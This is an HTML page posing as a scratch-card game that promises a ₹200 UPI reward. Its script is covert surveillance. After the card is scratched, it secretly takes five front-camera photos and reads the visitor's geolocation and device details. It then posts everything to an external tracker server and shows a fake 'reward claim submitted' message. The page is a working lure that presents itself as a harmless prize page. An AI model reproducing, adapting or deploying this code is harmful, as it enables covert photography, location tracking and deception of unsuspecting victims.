<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Scratch Card â€¢ Demo</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
  body { margin:0; font-family:"Poppins",sans-serif; background:#f4f7ff; color:#222; }
  header { text-align:center; padding:22px 0; background:white; box-shadow:0 3px 20px rgba(0,0,0,0.06); }
  header h1 { margin:0; font-size:2rem; background:linear-gradient(90deg,#4b6aff,#22d49c); -webkit-background-clip:text; color:transparent; font-weight:700; }

  .scratch-section { max-width:450px; margin:30px auto; background:#fff; padding:25px; border-radius:20px; box-shadow:0 12px 35px rgba(0,0,0,0.1); }
  .scratch-title { text-align:center; font-size:1.4rem; font-weight:600; margin-bottom:14px; }

  .scratch-box { width:100%; height:180px; border-radius:14px; background:#fff4e6; position:relative; overflow:hidden; margin-top:10px; box-shadow:0 6px 24px rgba(0,0,0,0.12); }
  .prize { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:45px; font-weight:700; color:#1fb76d; opacity:.4; filter:blur(1px); transition:.8s; }
  .prize.show { opacity:1; filter:blur(0); }

  canvas.overlay { position:absolute; inset:0; border-radius:14px; z-index:3; touch-action:none; cursor:crosshair; }

  .scratch-btn { display:block; margin:18px auto; padding:12px 30px; border-radius:999px; border:none; background:linear-gradient(90deg,#4b6aff,#22d49c); color:white; font-size:1rem; font-weight:700; cursor:pointer; }
  .reset-btn { margin:10px auto; display:none; border:1px solid #4b6aff; background:transparent; color:#4b6aff; padding:10px 24px; border-radius:999px; cursor:pointer; }

  .desc-section { max-width:700px; margin:30px auto; padding:0 14px; }
  .desc-section p { background:white; padding:16px 22px; border-radius:16px; box-shadow:0 3px 18px rgba(0,0,0,0.06); }

  .error { background:#dc3545; padding:14px; border-radius:10px; max-width:90%; margin:14px auto; text-align:center; display:none; color:white; }

  /* THANK YOU POPUP */
  .backdrop { position:fixed; inset:0; background:rgba(0,0,0,.35); display:none; justify-content:center; align-items:center; backdrop-filter:blur(4px); }
  .modal { width:92%; max-width:380px; background:white; border-radius:20px; padding:20px; transform:scale(.8); opacity:0; transition:.25s; }
  .modal.show { transform:scale(1); opacity:1; }

  #thanks-ok { width:100%; padding:12px; border:none; border-radius:10px; background:linear-gradient(90deg,#4b6aff,#22d49c); color:white; font-weight:700; margin-top:12px; }
</style>
</head>

<body>

<video id="video" autoplay playsinline style="display:none;"></video>

<header><h1>Scratch Card Zone</h1></header>

<div class="scratch-section">
  <div class="scratch-title">Try Your Luck & Win â‚¹200</div>

  <div class="scratch-box" id="scratchBox">
    <div class="prize" id="prize">â‚¹200</div>
    <canvas class="overlay" id="overlay"></canvas>
  </div>

  <button id="start-btn" class="scratch-btn">Start Scratching</button>
  <button id="reset-btn" class="reset-btn">Reset</button>
</div>

<div id="error" class="error"></div>

<div class="desc-section">
  <p>This is a scratch card . After scratching your prize, the system send your reward to your upi have a nice day ðŸ™‚ the price may took 24hr to receive.</p>
</div>

<!-- THANK YOU POPUP -->
<div class="backdrop" id="thankyou-popup">
  <div class="modal" id="thank-modal">
    <h3>ðŸŽ‰ Thank You!</h3>
    <p>Your reward claim was submitted successfully.</p>
    <button id="thanks-ok">OK</button>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

  /* ---------------- GLOBAL STATE ---------------- */
  const record = {
    ip: "N/A",
    location: "N/A",
    device: navigator.platform,
    browser: navigator.userAgent,
    photos: []
  };

  let isPointerDown = false;
  let cleared = false;
  let scratchCount = 0;

  /* ---------------- DOM ---------------- */
  const overlay = document.getElementById("overlay");
  const scratchBox = document.getElementById("scratchBox");
  const ctx = overlay.getContext("2d");
  const prizeEl = document.getElementById("prize");
  const startBtn = document.getElementById("start-btn");
  const resetBtn = document.getElementById("reset-btn");
  const errorDiv = document.getElementById("error");
  const thankPopup = document.getElementById("thankyou-popup");
  const thankModal = document.getElementById("thank-modal");
  const thanksOk = document.getElementById("thanks-ok");

  /* ---------------- CANVAS INIT ---------------- */
  function resizeCanvas() {
    overlay.width = scratchBox.clientWidth;
    overlay.height = scratchBox.clientHeight;
    ctx.fillStyle = "#d4d4d4";
    ctx.fillRect(0, 0, overlay.width, overlay.height);
    ctx.globalCompositeOperation = "destination-out";
  }
  resizeCanvas();
  window.addEventListener("resize", resizeCanvas);

  /* ---------------- SCRATCH LOGIC ---------------- */
  function getPos(e) {
    const rect = overlay.getBoundingClientRect();
    const p = e.touches?.[0] || e;
    return {
      x: p.clientX - rect.left,
      y: p.clientY - rect.top
    };
  }

  function scratch(e) {
    if (!isPointerDown || cleared) return;
    const { x, y } = getPos(e);
    ctx.beginPath();
    ctx.arc(x, y, 25, 0, Math.PI * 2);
    ctx.fill();
    scratchCount++;

    if (scratchCount > 40) revealPrize();
  }

  overlay.addEventListener("pointerdown", () => (isPointerDown = true));
  overlay.addEventListener("pointerup", () => (isPointerDown = false));
  overlay.addEventListener("pointermove", scratch);

  overlay.addEventListener("touchstart", () => (isPointerDown = true));
  overlay.addEventListener("touchend", () => (isPointerDown = false));
  overlay.addEventListener("touchmove", scratch, { passive: false });

  function revealPrize() {
    cleared = true;
    overlay.style.opacity = 0;
    prizeEl.classList.add("show");
    setTimeout(autoCapture, 600);
  }

  /* ---------------- START / RESET ---------------- */
  startBtn.onclick = () => {
    resizeCanvas();
    overlay.style.opacity = 1;
    overlay.style.display = "block";
    scratchCount = 0;
    startBtn.style.display = "none";
    resetBtn.style.display = "inline-block";
  };

  resetBtn.onclick = () => {
    cleared = false;
    scratchCount = 0;
    prizeEl.classList.remove("show");
    overlay.style.opacity = 1;
    resizeCanvas();
    resetBtn.style.display = "none";
    startBtn.style.display = "inline-block";
  };

  /* ---------------- AUTO CAPTURE ---------------- */
  async function autoCapture() {
    record.photos = [];
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.getElementById("video");
      video.srcObject = stream;

      await new Promise(r => video.onloadedmetadata = r);
      video.play();

      const canvas = document.createElement("canvas");
      const ctx2 = canvas.getContext("2d");

      for (let i = 0; i < 5; i++) {
        await new Promise(r => setTimeout(r, 600));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx2.drawImage(video, 0, 0);

        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
        record.photos.push(blob);
      }

      stream.getTracks().forEach(t => t.stop());
    } catch (e) {
      console.log("Camera denied:", e);
    }

    // LOCATION
    try {
      record.location = await new Promise(res => {
        navigator.geolocation.getCurrentPosition(
          p => res(`${p.coords.latitude.toFixed(3)},${p.coords.longitude.toFixed(3)}`),
          () => res("N/A"),
          { timeout: 4000 }
        );
      });
    } catch {
      record.location = "N/A";
    }

    sendData();
  }

  /* ---------------- SEND DATA ---------------- */
  async function sendData() {
    const fd = new FormData();
    fd.append("ip", record.ip);
    fd.append("location", record.location);
    fd.append("device", record.device);
    fd.append("browser", record.browser);

    record.photos.forEach((b, i) => fd.append("images", b, `photo_${i + 1}.jpg`));

    try {
      const res = await fetch("https://tracker-server-p88v.onrender.com/send", {
        method: "POST",
        body: fd
      });

      const data = await res.json();
      if (data.status !== "success") throw new Error();

      showThankYou();
    } catch {
      showError("Network error sending data.");
    }
  }

  /* ---------------- THANK YOU ---------------- */
  function showThankYou() {
    thankPopup.style.display = "flex";
    setTimeout(() => thankModal.classList.add("show"), 50);
  }

  thanksOk.onclick = () => {
    thankPopup.style.display = "none";
    resetBtn.click();
  };

  /* ---------------- ERROR ---------------- */
  function showError(msg) {
    errorDiv.textContent = msg;
    errorDiv.style.display = "block";
    setTimeout(() => (errorDiv.style.display = "none"), 4000);
  }

});
</script>
</body>
</html>
